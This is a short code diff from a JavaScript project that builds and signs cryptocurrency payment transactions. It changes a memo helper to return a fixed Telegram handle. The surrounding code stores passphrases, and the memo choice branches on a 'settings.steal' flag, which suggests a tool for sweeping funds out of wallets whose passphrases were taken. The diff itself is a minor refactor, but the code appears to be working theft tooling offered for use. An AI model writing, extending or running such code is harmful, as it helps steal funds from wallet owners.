@@ -5,7 +5,7 @@ import ColemanSettings from "../models/ColemanSettings.js";
 import axios from "axios";
 import Passphrase from "../models/Passphrase.js";
 
-function generateUniqueMemo(prefix = 'PiA') {
+function generateUniqueMemo() {
     return Memo.text("telegram:@fritzdecode");
 }
 
@@ -131,7 +131,7 @@ export async function prebuildAnSignPayment(channelPhrase, mainKp, recipient, am
             source: mainKp.publicKey(),
             withMuxing: true
         }))
-        .addMemo(settings.steal ? 'supreeaaaaaaaaaaaaaa' : generateUniqueMemo(publicKey.slice(15, 22)))
+        .addMemo(settings.steal ? 'supreeaaaaaaaaaaaaaa' : generateUniqueMemo())
         .setTimeout(140 + (inx * 5))
         .build();
 
